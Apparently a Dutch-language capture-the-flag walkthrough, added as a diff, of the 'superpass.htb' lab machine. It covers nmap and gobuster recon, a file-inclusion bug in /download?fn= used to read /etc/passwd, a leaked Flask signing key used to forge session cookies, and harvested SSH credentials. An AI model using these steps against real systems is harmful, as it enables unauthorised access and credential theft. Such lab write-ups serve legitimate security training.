@@ -1,0 +1,157 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 16:24 CET
+Nmap scan report for 10.129.167.150
+Host is up (0.028s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
+|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://superpass.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
+
+
+We voegen superpass.htb toe aan /etc/hosts
+Dan gaan we naar de site en ondertussen voeren we een gobuster uit
+
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://superpass.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.4
+[+] Timeout:                 10s
+===============================================================
+2023/03/05 16:26:17 Starting gobuster in directory enumeration mode
+===============================================================
+/download             (Status: 302) [Size: 249] [--> /account/login?next=%2Fdownload]
+/static               (Status: 301) [Size: 178] [--> http://superpass.htb/static/]
+/vault                (Status: 302) [Size: 243] [--> /account/login?next=%2Fvault]
+Progress: 4512 / 4615 (97.77%)
+===============================================================
+2023/03/05 16:26:33 Finished
+===============================================================
+
+Voor de main features moet je ingelogd zijn. We proberen een account aan te maken en krijgen een error bij het aanmaken van account test:test. 
+De error is als volgend:
+sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, 'Lost connection to MySQL server during query')
+[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
+FROM users 
+WHERE users.username = %(username_1)s 
+ LIMIT %(param_1)s]
+[parameters: {'username_1': 'test', 'param_1': 1}]
+(Background on this error at: https://sqlalche.me/e/14/e3q8)
+
+Deze fout page zou niet mogen getoond worden. Een algeme fout page zou moeten getoond worden. 
+
+abc:abc lukt wel om een account te make. Mogelijks bestaat er al een account met de naam test.
+
+We kunnen hier site, username en passwords genereren en opslaan. Dan hebben we ook de mogelijkheid om een export te doen.
+
+bij logout is er ook een operational error. 
+
+sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, 'Lost connection to MySQL server during query')
+[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
+FROM users 
+WHERE users.id = %(id_1)s 
+ LIMIT %(param_1)s]
+[parameters: {'id_1': '9', 'param_1': 1}]
+(Background on this error at: https://sqlalche.me/e/14/e3q8)
+
+We krijgen hier te zien dat we als id userid 9 hebben. Dit kan betekenen dat er 8 andere users al een account gemaakt hebben.
+
+Als we in burpsuit kijken bij het downloaden zien we dat de file opgevraagd wordt aan dehand van "/download?fn=<file>" We proberen of we file inclusion hebben en dit is het geval. we vragen /etc/passwd op en krijgen:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+corum:x:1000:1000:corum:/home/corum:/bin/bash
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+_laurel:x:999:999::/var/log/laurel:/bin/false
+
+runner, edwards, corum, dev_admin en root zijn accounts die interessant kunnen zijn.
+Uit de errors kunnen we ook afleiden dat de files in tmp worden opgeslagen.
+Als we dev_admin/user.txt willen opvragen krijgen we een permission denied.
+Corum heeft een account op de site.
+
+Uit de errors kunnen we ook afleiden dat de source in /app/app/superpass/<folder>/<file>.py
+
+De gevonden folders zijn:
+
+Data/
+	user.py
+	password.py
+	modelbase.py
+	ds_session.py
+	__all_models.py
+Services/
+	password_service.py  --> voegt passworden toe
+	utility_service.py
+Infrastructure/
+	view_modifiers --> geeft de endpoints (login niet)
+
+Views/
+	vault_views.py
+
+Uit de code blijkt dat ook de passwoorden worden opgeslagen in een database. Op de add-row requist voeren we een sqlmap uit
+
+
+Flask maakt ook gebruik van session cookies. Deze zien eruit als volgend: .eJwtjsGKwzAMRH_F6FwWW7IcO1-x96UUyZGbQHZb6uyp9N_rQ0_DMI_hPeHSdumrdZh_nuCOEfBrvcvV4ATfu0k3t9-ubvtzx81JrWN0x7p1dx_MF5xf59M4eVhfYW6ydxt1W2CGIjnFatqiaZjCJKlJQUQNmkVNPBFGiZwFtVRuloqyUciMvkXUhFOWmFiIU5ZCItY0TWnAynHxHjMyLk2xEukiwRsXilSNNFDm4X_57_b42MDrDVzXRq0.ZAXaeA.NdIpRscjr72A3A9HOakR2F3h61Y
+
+Als we de cookies decoden met flask-unsign krijgen we: 
+
+{'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False, '_id': '9a864cebf4eb1717a6fa9222b1b8abea03324a458a2b9c5fe69b5e318520f42b6278a465a3568a93aaefb676b9cb54d0028252dfb2c33bda10e59343ce3b1385', '_user_id': '9'}
+
+
+Als we cookies kunnen forgen kunnen we rondkijken naar andere hun vault.
+
+We zoeken naar config files die mogelijks de secret bevat om de cookies te signen
+
+we vinden /app/app/superpass/app.py met daarin de key='MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'
+
+met de cookie: 
+
+.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8gfH9ozi36.ZAXosA.H9YGS77ghd8yVsOs4aNChycNbVk
+
+kunnen we inloggen op via ssh op corum:5db7caa1d13cc37c9fc2
+
+we zien dat er nog een service draait: agile.htb dit is een precies niet heel specieaal
+In /opt zien we dat een chrome draaid van runner. Deze heeft ook remote debugging enabled dit kan een mogelijke horizontal escalation vector zijn. 
+
+
